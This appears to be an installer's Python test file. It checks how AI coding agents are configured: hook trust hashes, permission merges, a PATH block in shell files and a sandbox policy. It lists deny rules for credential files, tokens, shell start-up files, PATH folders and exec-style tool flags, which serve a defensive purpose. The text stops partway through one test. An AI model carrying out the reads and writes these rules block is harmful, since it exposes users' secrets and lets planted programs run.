#!/usr/bin/env python3
"""Tests for the installer fixes of 2026-11-12: Codex hook trust, Claude permissions merge, PATH block in
shell files, Hermes MCP re-add of disabled servers, Claude hand-off text, Codex env, Grounded Docs unit.
Throwaway HOME and CODEX_HOME, stub binaries, no network, nothing outside the temp dir.

Run: python3 ai/tests/test_setup.py   (bash ai/tests/run.sh runs it too)
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time

TESTS = os.path.dirname(os.path.realpath(__file__))
AI_DIR = os.path.dirname(TESTS)
REPO = os.path.dirname(AI_DIR)
PLUGIN = os.path.join(AI_DIR, "marketplace", "plugins", "ai-core")
AICONF = os.path.join(AI_DIR, "lib", "aiconf.py")
FAILS = []
sys.dont_write_bytecode = True

try:
    import tomllib
except ImportError:      # python < 3.11: structure checks still run, TOML parse is skipped
    tomllib = None


def main():
    work = tempfile.mkdtemp(prefix="ai-setup-tests-")
    try:
        for test in (t_codex_trust, t_codex_trust_hash_pin, t_codex_managed, t_claude_permissions, t_path_block, t_hermes_disabled,
                     t_claude_handoff, t_codex_env, t_dropped, t_sandbox_policy, t_hooks_remove, t_knowledge_status, t_session_start_order,
                     t_user_hook_match, t_verify_source, t_connectors_keep, t_sudo_gate, t_gate_skip_owner_only,
                     t_root_guard, t_update_clone, t_ai_sync_untrusted, t_plugin_files_tracked,
                     t_hooks_absolute, t_uv_copy, t_box_registration, t_readiness, t_managed_router,
                     t_owner_2026_11_12):
            try:
                test(os.path.join(work, test.__name__))
                print("ok   " + test.__name__)
            except AssertionError as exc:
                FAILS.append("%s: %s" % (test.__name__, exc))
                print("FAIL %s: %s" % (test.__name__, exc))
            except Exception as exc:        # a crash in one test must not stop the others
                FAILS.append("%s: %s: %s" % (test.__name__, type(exc).__name__, exc))
                print("FAIL %s: crashed: %s: %s" % (test.__name__, type(exc).__name__, exc))
    finally:
        shutil.rmtree(work, ignore_errors=True)
    print("%d setup tests failed" % len(FAILS))
    return 1 if FAILS else 0


# ---------------------------------------------------------------- helpers

def aiconf(state, *args, env=None):
    res = subprocess.run([sys.executable, AICONF, "--state", state] + list(args), stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, env=env)
    return res.returncode, res.stdout.decode()


def write(path, text, mode=None):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as fh:
        fh.write(text)
    if mode:
        os.chmod(path, mode)


def read(path):
    with open(path) as fh:
        return fh.read()


def stub(bindir, name, body="exit 0"):
    write(os.path.join(bindir, name), "#!/bin/sh\n" + body + "\n", 0o755)


def bash(script, env):
    res = subprocess.run(["bash", "-c", script], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
    return res.returncode, res.stdout.decode()


def plugin_snapshot(work):
    """A private copy of ai-core for one test. The live plugin folder can change under a running test
    (ai-render rewrites hooks/routing.json and L0.md; another suite run in the same work tree does that),
    so every hash comparison uses this snapshot as the source, never PLUGIN itself."""
    snap = os.path.join(work, "plugin-src")
    if not os.path.isdir(snap):
        shutil.copytree(PLUGIN, snap, ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
        # A Linux admin install points the ROOT-OWNED copy's manifest at the empty managed hooks file (the
        # hooks live in /etc/codex/hooks.json there). These tests are about plugin hooks: always use the
        # repo form of the manifest, whichever copy the suite runs from.
        man = os.path.join(snap, ".codex-plugin", "plugin.json")
        data = json.load(open(man))
        data["hooks"] = "./hooks/codex-hooks.json"
        write(man, json.dumps(data, indent=2) + "\n")
    return snap


def fake_codex_home(work):
    home = os.path.join(work, "codex")
    root = os.path.join(home, "plugins", "cache", "ai", "ai-core", "1.0.0")
    shutil.copytree(plugin_snapshot(work), root)
    write(os.path.join(home, "hooks.json"), json.dumps({"hooks": {
        "PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "rtk hook codex"}]}],
        "Stop": [{"hooks": [{"type": "command", "command": "node /x/omx-stop.js", "timeout": 30}]}]}}))
    return home, root


# ---------------------------------------------------------------- tests

def t_codex_trust(work):
    """Trust hashes for ai-core plugin hooks + rtk only; foreign tables kept; idempotent; check; undo."""
    home, _root = fake_codex_home(work)
    cfg = os.path.join(home, "config.toml")
    hooks_json = os.path.join(home, "hooks.json")
    foreign = '[hooks.state."%s:stop:0:0"]\ntrusted_hash = "sha256:omx"\n' % hooks_json
    stale_ours = '[hooks.state."ai-core@ai:hooks/codex-hooks.json:stop:0:0"]\ntrusted_hash = "sha256:old"\n'
    write(cfg, 'model = "x"\n\n' + foreign + "\n" + stale_ours)
    state = os.path.join(work, "state.json")
    code, out = aiconf(state, "codex-trust-hooks", cfg, "--auto")
    assert code == 0, out
    text = read(cfg)
    if tomllib:
        data = tomllib.loads(text)
        st = data["hooks"]["state"]
        assert st["%s:stop:0:0" % hooks_json]["trusted_hash"] == "sha256:omx", "OMX entry must stay untouched"
        assert "%s:pre_tool_use:0:0" % hooks_json in st, "rtk hook of hooks.json not trusted"
        ours = st["ai-core@ai:hooks/codex-hooks.json:stop:0:0"]
        assert ours["trusted_hash"] != "sha256:old" and ours["trusted_content_hash"].startswith("sha256:"), \
            "stale ai-core entry not updated in place"
        keys = [k for k in st if k.startswith("ai-core@ai:")]
        assert len(keys) == 8, "expected 8 ai-core hook handlers, got %d" % len(keys)
    assert text.count('"ai-core@ai:hooks/codex-hooks.json:stop:0:0"') == 1, "duplicate table"
    code, out2 = aiconf(state, "codex-trust-hooks", cfg, "--auto")
    assert code == 0 and "same" in out2 and read(cfg) == text, "second run must change nothing: " + out2
    code, out3 = aiconf(os.devnull, "codex-trust-hooks", cfg, "--auto", "--check")
    assert code == 0 and "FAIL" not in out3, out3
    # A changed plugin file invalidates the content hash: --check must FAIL.
    with open(os.path.join(_root, "hooks", "router.py"), "a") as fh:
        fh.write("\n# changed\n")
    code, out4 = aiconf(os.devnull, "codex-trust-hooks", cfg, "--auto", "--check")
    assert code == 1 and "hash differs" in out4, "plugin change not detected: " + out4
    code, out5 = aiconf(state, "undo")
    assert code == 0, out5
    after = read(cfg)
    assert "ai-core hook trust" not in after and 'trusted_hash = "sha256:old"' in after, \
        "undo must drop our block and restore the old in-place value:\n" + after
    assert 'trusted_hash = "sha256:omx"' in after


def t_codex_trust_hash_pin(work):
    """Declaration hash identity, pinned against the value codex-cli itself listed (hooks/list) for the
    ai-core stop hook. A change here means Codex will not trust what install writes."""
    sys.path.insert(0, os.path.join(AI_DIR, "lib"))
    import aiconf as mod
    h = mod.codex_hook_hash("Stop", None, {"type": "command", "timeout": 25,
                                           "command": 'python3 "${PLUGIN_ROOT}/hooks/router.py" --agent codex Stop'})
    assert h == "sha256:9d29f445558756f3ad1935280cc8ba80665a085008ce67af84d3f19611219813", h
    h2 = mod.codex_hook_hash("PreToolUse", "Bash", {"type": "command", "timeout": 25,
                                                     "command": 'python3 "${PLUGIN_ROOT}/hooks/router.py" --agent codex PreToolUse'})
    assert h2 == "sha256:d8c225b411a4cc69843c2db1f6fe0fa4860cf9e582cd1901b94db102ae5bfb5f", h2
    # Content hash format: empty plugin dir.
    d = os.path.join(work, "empty")
    os.makedirs(d)
    assert mod.codex_plugin_content_hash(d).startswith("sha256:")


def t_codex_managed(work):
    """/etc/codex/hooks.json content: absolute root-copy paths, rtk handlers from rtk's own output, nothing
    unresolved; with the manifest pointed at the managed file the plugin needs no trust entries."""
    home, root = fake_codex_home(work)
    rtk_out = os.path.join(work, "rtk-hooks.json")
    write(rtk_out, json.dumps({"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [
        {"type": "command", "command": "rtk hook codex"}, {"type": "command", "command": "graphify hook-guard"}]}]}}))
    sbin = os.path.join(work, "sbin")
    for name in ("rtk", "node", "python3", "sh"):
        stub(sbin, name)
    safe = ["--safe-path", sbin, "--allow-user-owned"]
    res = subprocess.run([sys.executable, AICONF, "--state", os.devnull, "codex-managed-hooks", "--plugin-root",
                          "/usr/local/lib/ai/repo/ai/marketplace/plugins/ai-core", "--hooks",
                          os.path.join(PLUGIN, "hooks", "codex-hooks.json"), "--extra", rtk_out] + safe,
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    assert res.returncode == 0, res.stdout
    text = res.stdout.decode()
    data = json.loads(text)
    assert "${" not in text and "/usr/local/lib/ai/repo/ai/marketplace/plugins/ai-core/hooks/router.py" in text
    cmds = [h["command"] for gs in data["hooks"].values() for g in gs for h in g["hooks"]]
    assert all(c.startswith(("/usr/bin/python3 ", "/bin/sh ", sbin + "/")) for c in cmds), \
        "every program must be absolute: %s" % cmds
    assert any(c.startswith(sbin + "/rtk hook codex") for c in cmds), "the rtk handler gets its safe path"
    pre = [h["command"] for g in data["hooks"]["PreToolUse"] for h in g["hooks"]]
    assert sbin + "/rtk hook codex" in pre and not any("graphify" in c for c in pre), pre
    assert set(data["hooks"]) >= {"SessionStart", "UserPromptSubmit", "PreToolUse", "PostToolUse", "Stop", "SessionEnd"}
    # Vendor plugin (Ponytail shape): root comes from process.env, so the managed copy sets it in front.
    vroot = os.path.join(work, "opt", "ponytail")
    write(os.path.join(vroot, ".codex-plugin", "plugin.json"), json.dumps({"name": "ponytail",
                                                                          "hooks": "./hooks/claude-codex-hooks.json"}))
    vhooks = {"hooks": {"SessionStart": [{"matcher": "startup", "hooks": [{"type": "command", "timeout": 15,
              "command": "node -e \"require(process.env.CLAUDE_PLUGIN_ROOT + '/hooks/a.js')\""}]}]}}
    write(os.path.join(vroot, "hooks", "claude-codex-hooks.json"), json.dumps(vhooks))
    # Without the owner override, a user-owned program is refused (these hooks run for every user).
    res = subprocess.run([sys.executable, AICONF, "--state", os.devnull, "codex-managed-hooks", "--plugin-root", "/r",
                          "--hooks", os.path.join(PLUGIN, "hooks", "codex-hooks.json"), "--plugin", vroot,
                          "--safe-path", sbin], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    assert res.returncode != 0 and b"not root-owned" in res.stdout, res.stdout
    res = subprocess.run([sys.executable, AICONF, "--state", os.devnull, "codex-managed-hooks", "--plugin-root", "/r",
                          "--hooks", os.path.join(PLUGIN, "hooks", "codex-hooks.json"), "--plugin", vroot] + safe,
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    assert res.returncode == 0, res.stdout
    starts = [h["command"] for g in json.loads(res.stdout)["hooks"]["SessionStart"] for h in g["hooks"]]
    assert any(c.startswith("CLAUDE_PLUGIN_ROOT=%s PLUGIN_ROOT=%s %s/node -e" % (vroot, vroot, sbin)) for c in starts), \
        starts
    # Its installed Codex plugin copy: switched off AND trusted (else "Hooks need review" at every start).
    shutil.copytree(vroot, os.path.join(home, "plugins", "cache", "ponytail", "ponytail", "5.3.3"))
    cfg0 = os.path.join(home, "config.toml")
    write(cfg0, 'model = "x"\n')
    code, out = aiconf(os.path.join(work, "st0.json"), "codex-trust-hooks", cfg0, "--disable", "ponytail@ponytail")
    assert code == 0, out
    t = tomllib.loads(read(cfg0))["hooks"]["state"]["ponytail@ponytail:hooks/claude-codex-hooks.json:session_start:0:0"] \
        if tomllib else None
    if t is not None:
        assert t["enabled"] is False and t["trusted_hash"].startswith("sha256:") and "trusted_content_hash" in t, t
    code, out = aiconf(os.devnull, "codex-trust-hooks", cfg0, "--disable", "ponytail@ponytail", "--check")
    assert code == 0 and "off and reviewed" in out, out
    man = os.path.join(root, ".codex-plugin", "plugin.json")
    m = json.load(open(man))
    m["hooks"] = "./hooks/codex-hooks.managed.json"
    write(man, json.dumps(m))
    os.remove(os.path.join(home, "hooks.json"))
    cfg = os.path.join(home, "config.toml")
    write(cfg, 'model = "x"\n')
    code, out = aiconf(os.devnull, "codex-trust-hooks", cfg, "--auto", "--check")
    assert code == 0 and "FAIL" not in out, "managed install must need no trust entries: " + out


def bash_env(work, extra=None):
    home = os.path.join(work, "home")
    bindir = os.path.join(work, "bin")
    os.makedirs(home, exist_ok=True)
    os.makedirs(bindir, exist_ok=True)
    env = {"PATH": bindir + ":" + os.environ.get("PATH", "/usr/bin:/bin"), "HOME": home, "LANG": "C.UTF-8",
           "AI_HOME": REPO, "PYTHONDONTWRITEBYTECODE": "1",
           "AI_PROJ_AGENT_PATH": "/nonexistent/proj-agent",   # same result on a server that has proj-agent
           "AI_PROJ_AGENT_SOCK": "/nonexistent/proj-agent.sock"}
    env.update(extra or {})
    return env, home, bindir


LIBS = ('. "$AI_HOME/ai/lib/common.sh"; for f in base tools claude codex hermes; do . "$AI_HOME/ai/adapters/$f.sh"; '
        'done; load_pins; ')


def t_claude_permissions(work):
    """Merge, not replace: user rules and other keys kept; ours added once; deny covers config files."""
    env, home, bindir = bash_env(work)
    stub(bindir, "claude")
    settings = os.path.join(home, ".claude", "settings.json")
    stale = "mcp__plugin_ai-core_github__projects_list"
    write(settings, json.dumps({"model": "opus", "permissions": {"allow": ["Bash(ls)", stale], "deny": ["Bash(rm *)"]}}))
    # An earlier install recorded the GitHub MCP allow rule as ours (the server had it left over).
    write(os.path.join(home, ".local", "state", "ai", "managed-keys.json"), json.dumps({"version": 1, "entries": [
        {"kind": "json-item", "file": settings, "path": ["permissions", "allow"], "item": stale, "had_list": True,
         "key": "json-item:%s:permissions/allow:%s" % (settings, json.dumps(stale))},
        {"kind": "json-item", "file": settings, "path": ["permissions", "deny"], "item": "Write(~/.bashrc)",
         "had_list": True, "key": "json-item:%s:permissions/deny:%s" % (settings, json.dumps("Write(~/.bashrc)"))}]}))
    perms0 = json.load(open(settings))
    perms0["permissions"]["deny"].append("Write(~/.bashrc)")
    write(settings, json.dumps(perms0))
    for _ in range(2):
        code, out = bash(LIBS + 'AI_OS=linux; claude_permissions', env)
        assert code == 0, out
    data = json.load(open(settings))
    perms = data["permissions"]
    assert data["model"] == "opus", "other keys must stay"
    assert perms["allow"][0] == "Bash(ls)" and "Bash(rm *)" in perms["deny"], "user rules must stay"
    assert stale not in perms["allow"], "a rule an earlier install added and the lists dropped must go"
    assert len(perms["allow"]) == len(set(perms["allow"])), "duplicates after a second run"
    for rule in ("mcp__plugin_ai-serena_serena__find_symbol", "mcp__plugin_ai-serena_serena__read_memory",
                 "mcp__plugin_ai-core_context7__*", "Bash(gh pr view *)", "Bash(gh issue list*)",
                 "Bash(graphify query *)", "Bash(agent-audit *)",
                 "Bash(ai-doctor*)", "WebFetch", "WebSearch", "Read(~/.claude/plugins/**)", "Read(~/.config/ai/**)"):
        assert rule in perms["allow"], "missing allow " + rule
    assert not any(r.startswith("Write(") for r in perms["deny"]), "Claude ignores Write(path) rules: Edit covers them"
    # Every user-writable PATH folder and shell start-up file: a planted program there would shadow a system one.
    for rule in ("Edit(~/.local/bin/**)", "Edit(~/bin/**)", "Edit(~/.npm-global/bin/**)", "Edit(~/.cargo/bin/**)",
                 "Edit(~/go/bin/**)", "Edit(~/.bun/bin/**)", "Edit(~/.deno/bin/**)", "Edit(~/.zshrc)",
                 "Edit(~/.bash_profile)", "Edit(~/.zprofile)", "Edit(~/.config/environment.d/**)"):
        assert rule in perms["deny"], "missing deny " + rule
    assert not any("*" in r and r.startswith("Edit(") and "/" not in r for r in perms["deny"]), "a glob expanded"
    for rule in ("Edit(~/.claude/settings.json)", "Edit(//etc/claude-code/**)",
                 "Edit(~/.codex/config.toml)", "Edit(~/.hermes/config.yaml)", "Read(~/.config/ai/secrets.env)",
                 "Edit(~/.claude.json)", "Edit(~/.claude/plugins/**)", "Edit(~/.claude/CLAUDE.md)",
                 "Edit(~/.codex/AGENTS.md)", "Edit(~/.serena/serena_config.yml)", "Edit(~/.serena/memories/global/**)",
                 "Edit(~/.bashrc)", "Edit(~/.zshenv)", "Edit(~/.profile)", "Edit(**/.claude/settings.json)",
                 "Edit(**/.claude/settings.local.json)", "Bash(git * --output*)", "Bash(rtk git * --output*)"):
        assert rule in perms["deny"], "missing deny " + rule
    assert not any(r.startswith("Bash(sudo") for r in perms["deny"]), "sudo is a router gate now, not a deny list"
    for rule in ("Bash(graphify * install*)", "Bash(graphify * uninstall*)", "Bash(graphify * hook*)"):
        assert rule in perms["ask"], "missing ask " + rule
    for bad in ("Bash(graphify *)", "Bash(rtk *)"):
        assert bad not in perms["allow"], "allow must not hold " + bad
    # What the RTK hook rewrites read-only commands into is allowed; the exec/write forms are denied.
    for rule in ("Bash(rtk grep *)", "Bash(rtk rg *)", "Bash(rtk find *)", "Bash(rtk tree*)", "Bash(rtk git diff*)"):
        assert rule in perms["allow"], "missing allow " + rule
    for rule in ("Bash(rtk find *-exec*)", "Bash(rtk find *-delete*)", "Bash(rtk find *-execdir*)",
                 "Bash(rtk grep *--pre*)", "Bash(rtk rg *--pre*)", "Bash(rtk rg *--hostname-bin*)",
                 "Bash(rtk tree* -o*)", "Bash(rtk git * --ext-diff*)"):
        assert rule in perms["deny"], "missing deny " + rule
    assert "Bash(graphify install*)" in perms["ask"], "graphify install must ask"
    bad = [r for r in perms["allow"] if "github__" in r or "grounded-docs" in r or "push" in r
           or r.startswith(("Bash(rtk *", "Bash(sudo", "Edit", "Write", "Bash(gh pr create", "Bash(gh api"))]
    assert "Bash(git push*)" in perms["ask"], "git push must always ask"
    assert not bad, "write rules in allow: %s" % bad
    code, out = bash(LIBS + 'AI_OS=macos; claude_deny_rules', env)
    assert "sudo" not in out


def t_path_block(work):
    """~/.local/bin block goes ABOVE Ubuntu's non-interactive return; idempotent; undo restores the file."""
    env, home, _bindir = bash_env(work, {"SHELL": "/bin/bash"})
    rc = os.path.join(home, ".bashrc")
    orig = "# ~/.bashrc\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\nalias ll='ls -l'\n"
    write(rc, orig)
    state = os.path.join(work, "state.json")
    for _ in range(2):
        code, out = bash(LIBS + 'AI_OS=linux; AI_STATE_FILE=%s; base_path_block' % state, env)
        assert code == 0, out
    text = read(rc)
    assert text.count("AI:path v1 START") == 1, "block written twice"
    assert text.index(".local/bin") < text.index("return;;"), "block must come before the interactive guard"
    assert text.startswith("# <!-- AI:path v1 START -->"), "markers must be shell comments"
    res = subprocess.run(["env", "-i", "HOME=" + home, "PATH=/usr/bin:/bin", "bash", "-c",
                          '. "$HOME/.bashrc"; printf %s "$PATH"'], stdout=subprocess.PIPE)
    assert os.path.join(home, ".local", "bin") in res.stdout.decode(), "PATH not set for non-interactive bash"
    code, out = aiconf(state, "undo")
    assert read(rc) == orig, "undo must restore the original file:\n" + read(rc)
    # An older install appended the block BELOW the guard: the next run moves it to the top.
    write(rc, orig + "# <!-- AI:path v1 START -->\nPATH=old\n# <!-- AI:path v1 END -->\n")
    code, out = bash(LIBS + 'AI_OS=linux; AI_STATE_FILE=%s; base_path_block' % state, env)
    text = read(rc)
    assert text.count("AI:path v1 START") == 1 and text.index(".local/bin") < text.index("return;;"), text
    res = subprocess.run(["env", "-i", "HOME=" + home, "PATH=/usr/bin:/bin", "bash", "-c",
                          '. "$HOME/.bashrc"; printf %s "$PATH"'], stdout=subprocess.PIPE)
    assert os.path.join(home, ".local", "bin") in res.stdout.decode(), "moved block must work"


def t_hermes_disabled(work):
    """A server Hermes saved disabled is removed and re-added; an enabled equal one is kept; --skip works."""
    env, home, bindir = bash_env(work)
    hh = os.path.join(home, ".hermes")
    log = os.path.join(work, "hermes.log")
    stub(bindir, "hermes", 'echo "$*" >> %s' % log)
    write(os.path.join(hh, "config.yaml"),
          "mcp_servers:\n  serena:\n    command: serena\n    args: [start-mcp-server, --project-from-cwd, --context=ide]\n"
          "    enabled: false\n  grounded-docs:\n    url: http://127.0.0.1:6280/mcp\n    enabled: true\n")
    env["HERMES_HOME"] = hh
    mcp = os.path.join(work, "mcp.json")
    write(mcp, json.dumps({"mcpServers": {
        "serena": {"command": "serena", "args": ["start-mcp-server", "--project-from-cwd", "--context=claude-code"]},
        "grounded-docs": {"type": "http", "url": "http://127.0.0.1:6280/mcp"},
        "github": {"command": "/p/mcp/github.sh", "args": []}}}))
    code, out = aiconf(os.path.join(work, "state.json"), "mcp-register", "hermes", "--mcp-json", mcp,
                       "--plugin-root", "/p", "--skip", "github", env=env)
    assert code == 0, out
    calls = read(log) if os.path.exists(log) else ""
    assert "mcp remove serena" in calls and "mcp add serena" in calls, "disabled serena not re-added: " + calls
    assert "grounded-docs" not in calls, "enabled equal server must not be touched: " + calls
    assert "github" not in calls, "--skip github ignored: " + calls


def t_claude_handoff(work):
    """Hand-off to Claude only when it is logged in for this user; else the skill files."""
    env, home, bindir = bash_env(work)
    stub(bindir, "claude")
    code_tpl = ("import sys; sys.dont_write_bytecode=True; sys.path.insert(0, %r); import router; "
                "print(repr(router.claude_handoff(sys.argv[1])))" % os.path.join(PLUGIN, "hooks"))

    def handoff(agent):
        res = subprocess.run([sys.executable, "-c", code_tpl, agent], stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             env=env)
        return res.stdout.decode()
    assert handoff("claude").strip() == "''", "Claude itself gets no hand-off text"
    out = handoff("codex")
    assert "not logged in" in out and "do not hand off" in out, "Codex without a Claude login: " + out
    write(os.path.join(home, ".claude", ".credentials.json"), "{}")     # logged in from here on
    out = handoff("hermes")
    assert "Do not hand off" in out and "skill files" in out.lower(), "Hermes never hands off: " + out
    out = handoff("codex")
    assert "Follow the skill files yourself" in out and "owner approved" in out and "network" in out, out
    assert "hand it to Claude Code" in handoff("opencode"), "opencode hands off when Claude is logged in"
    os.remove(os.path.join(home, ".claude", ".credentials.json"))
    assert "not logged in" in handoff("opencode")


def t_codex_env(work):
    """Env switches land in [shell_environment_policy.set]; existing keys there are kept."""
    env, home, bindir = bash_env(work)
    cfg = os.path.join(home, ".codex", "config.toml")
    write(cfg, '[shell_environment_policy.set]\nUSE_OMX_EXPLORE_CMD = "0"\n')
    code, out = bash(LIBS + 'AI_OS=linux; codex_env', env)
    assert code == 0, out
    text = read(cfg)
    if tomllib:
        got = tomllib.loads(text)["shell_environment_policy"]["set"]
        assert got["USE_OMX_EXPLORE_CMD"] == "0" and got["GRAPHIFY_BACKEND"] == "none" \
            and got["DISABLE_TELEMETRY"] == "1", got
    else:
        assert 'GRAPHIFY_BACKEND = "none"' in text
    assert 'GIT_GUARD_AGENT = "1"' in text, "git guard agent mode for every command Codex runs"


def t_dropped(work):
    """Grounded Docs and GitHub MCP are gone from the plugin; their recorded installs are replayed away by
    undo --only, other records stay; ai-serena is a separate opt-in plugin."""
    mcp = json.load(open(os.path.join(PLUGIN, ".mcp.json")))["mcpServers"]
    assert sorted(mcp) == ["box", "context7"], mcp
    ser = json.load(open(os.path.join(AI_DIR, "marketplace", "plugins", "ai-serena", ".mcp.json")))["mcpServers"]
    assert "serena" in ser
    names = [p["name"] for p in json.load(open(os.path.join(AI_DIR, "marketplace", ".claude-plugin",
                                                          "marketplace.json")))["plugins"]]
    assert names == ["ai-core", "ai-serena", "ai-playwright"], names
    assert not os.path.exists(os.path.join(AI_DIR, "mcp", "docs-server"))
    pins = read(os.path.join(AI_DIR, "pins.env"))
    assert "DOCS_MCP" not in pins and "GITHUB_MCP" not in pins
    state = os.path.join(work, "state.json")
    log = os.path.join(work, "undo.log")
    write(state, json.dumps({"version": 1, "entries": [
        {"kind": "cmd", "id": "npm:docs-mcp", "undo": ["sh", "-c", "echo docs >> %s" % log], "key": "cmd:npm:docs-mcp"},
        {"kind": "cmd", "id": "ufw:eth0:6280", "undo": ["sh", "-c", "echo ufw >> %s" % log], "key": "cmd:ufw:eth0:6280"},
        {"kind": "cmd", "id": "bin:github-mcp-server", "undo": ["sh", "-c", "echo gh >> %s" % log],
         "key": "cmd:bin:github-mcp-server"},
        {"kind": "cmd", "id": "codex-mcp:github", "undo": ["sh", "-c", "echo cgh >> %s" % log], "key": "cmd:codex-mcp:github"},
        {"kind": "cmd", "id": "bin:rtk", "undo": ["sh", "-c", "echo rtk >> %s" % log], "key": "cmd:bin:rtk"}]}))
    env, home, _b = bash_env(work)
    code, out = bash(LIBS + 'AI_OS=linux; aiconf_root() { python3 "$AI_HOME/ai/lib/aiconf.py" --state %s "$@"; }; '
                     'AI_SYSTEM_STATE_FILE=%s; AI_MODE=system; tools_drop_system; AI_STATE_FILE=%s; tools_drop_user'
                     % (state, state, state), env)
    assert code == 0, out
    done = read(log).split()
    assert sorted(done) == ["cgh", "docs", "gh", "ufw"], done
    left = [e["key"] for e in json.load(open(state))["entries"]]
    assert left == ["cmd:bin:rtk"], left


def t_sandbox_policy(work):
    """The managed sandbox block: required, credential reads denied, limited writes, proxy domains."""
    env, home, _b = bash_env(work)
    code, out = bash(LIBS + "claude_sandbox_json", env)
    assert code == 0, out
    sb = json.loads(out)
    assert sb["enabled"] is True and sb["failIfUnavailable"] is True and sb["allowUnsandboxedCommands"] is False
    for p in ("~/.ssh", "~/.config/gh", "~/.claude/.credentials.json", "~/.codex/auth.json",
              "~/.config/ai/secrets.env", "~/.hermes/.env"):
        assert p in sb["filesystem"]["denyRead"] and {"path": p, "mode": "deny"} in sb["credentials"]["files"], p
    assert "/tmp" in sb["filesystem"]["allowWrite"] and "~/.local/state/ai" in sb["filesystem"]["allowWrite"]
    assert not any(w in ("~", "~/", "/") for w in sb["filesystem"]["allowWrite"])
    for d in ("github.com", "registry.npmjs.org", "pypi.org", "files.pythonhosted.org", "context7.com"):
        assert d in sb["network"]["allowedDomains"], d
    # Commands that leave the sandbox: only absolute paths of root-owned programs, never a bare name (PATH
    # starts with ~/.local/bin, which Claude's Write tool can fill).
    assert all(c.startswith("/") for c in sb["excludedCommands"]), sb["excludedCommands"]
    progs = os.path.join(work, "sysbin")
    for name in ("git", "gh"):
        stub(progs, name, "exit 0")
    os.chmod(progs, 0o755)
    code, out = bash(LIBS + "claude_sandbox_json", dict(env, AI_SANDBOX_PROG_DIRS=progs))
    assert json.loads(out)["excludedCommands"] == [], "user-owned git/gh must never leave the sandbox"
    code, out = bash(LIBS + "claude_sandbox_json; claude_allow_rules; claude_ask_rules",
                     dict(env, AI_SANDBOX_PROG_DIRS=progs, AI_SANDBOX_PROG_INSECURE_TEST="1"))
    first, rest = out.split("\n", 1)
    exc = json.loads(first)["excludedCommands"]
    assert progs + "/git push *" in exc and progs + "/gh pr view *" in exc, exc
    assert not any(c.startswith(("git ", "gh ", "bash", "sh ")) or " api " in c for c in exc), exc
    assert "Bash(%s/gh pr view *)" % progs in rest and "Bash(%s/git push*)" % progs in rest, rest
    os.chmod(os.path.join(progs, "gh"), 0o777)
    code, out = bash(LIBS + "claude_sandbox_json", dict(env, AI_SANDBOX_PROG_DIRS=progs, AI_SANDBOX_PROG_INSECURE_TEST="1"))
    assert not any("/gh " in c for c in json.loads(out)["excludedCommands"]), "a writable gh must stay sandboxed"
    assert {"name": "GITHUB_PERSONAL_ACCESS_TOKEN", "mode": "deny"} in sb["credentials"]["envVars"]
    # Dry run of the whole managed policy (no root needed): the lock and the RTK managed hook are planned.
    code, out = bash(LIBS + "AI_OS=linux; AI_DRY_RUN=1; claude_managed_policy; codex_system_policy() { :; }", env)
    assert code == 0 and "strictPluginOnlyCustomization" in out and "sandbox" in out, out
    # "set ... = true" on a fresh machine, "same ..." where the managed file already holds it (the server).
    assert "enabledPlugins/ai-core@ai" in out, "ai-core must be force-enabled from managed settings"
    # Ubuntu with the userns restriction: Claude must use the profiled bubblewrap copy, never /usr/bin/bwrap.
    code, out = bash(LIBS + "AI_SANDBOX_BWRAP_FORCE=1 claude_sandbox_json_final", env)
    assert json.loads(out)["bwrapPath"] == "/usr/local/lib/ai/bwrap", out
    # Server with the box tool: unix sockets stay blocked in the sandbox (no allow-all, no hide list); box
    # work goes through the box MCP tools, which are allowed; no Bash rule for proj-agent, no sudo form.
    code, out = bash(LIBS + "AI_OS=linux; AI_PROJ_AGENT_FORCE=1 claude_sandbox_json_final", env)
    sbj = json.loads(out)
    assert sbj["network"]["allowAllUnixSockets"] is False and "allowUnixSockets" not in sbj["network"], sbj["network"]
    assert "/run/user" not in sbj["filesystem"]["denyRead"], "no hide list any more"
    assert not any("proj-agent" in e or e.startswith("sudo") for e in sbj["excludedCommands"]), sbj["excludedCommands"]
    code, out = bash(LIBS + "AI_OS=linux; AI_PROJ_AGENT_FORCE=1 claude_allow_rules", env)
    assert "mcp__plugin_ai-core_box__*" in out and "proj-agent" not in out, out
    code, out = bash(LIBS + "AI_OS=linux; claude_allow_rules", env)
    assert "box__" not in out, "no box tool on this machine: no rule"
    code, out = bash(LIBS + "AI_OS=macos; AI_PROJ_AGENT_FORCE=1 claude_allow_rules; claude_sandbox_json_final", env)
    assert "proj-agent" not in out and "box__" not in out, "macOS has no box tool: no rule"
    # Writes a sandboxed command may never make, whatever its working folder (Fable round 3).
    for p in ("~/.local/bin", "~/bin", "~/.npm-global/bin", "~/.cargo/bin", "~/go/bin", "~/.bun/bin", "~/.deno/bin",
              "~/.local/share/uv/tools", "~/.bashrc", "~/.profile", "~/.zshenv", "~/.zshrc", "~/.gitconfig",
              "~/.config", "~/.codex", "~/.claude", "~/.hermes", "~/.serena"):
        assert p in sbj["filesystem"]["denyWrite"], "denyWrite misses " + p
    assert not set(sbj["filesystem"]["denyWrite"]) & set(sbj["filesystem"]["allowWrite"]), "a path both allowed and denied"
    assert "~/.cache/uv" not in sbj["filesystem"]["allowWrite"] and "~/.cache/ai-sandbox" in sbj["filesystem"]["allowWrite"]
    assert "allowGitConfig" not in sbj, "Claude's built-in .git/hooks and .git/config protection stays on"
    prof = read(os.path.join(AI_DIR, "adapters", "linux", "apparmor-bwrap"))
    assert "profile ai-claude-bwrap /usr/local/lib/ai/bwrap flags=(unconfined)" in prof and "userns," in prof
    assert "/usr/bin/bwrap flags" not in prof, "Ubuntu's /usr/bin/bwrap restriction must stay for other programs"
    stub(_b, "sysctl", "echo 1")
    stub(_b, "bwrap", "exit 0"); stub(_b, "socat", "exit 0"); stub(_b, "rg", "exit 0")
    stub(_b, "getent", "exit 2")       # group ai-sandbox does not exist yet
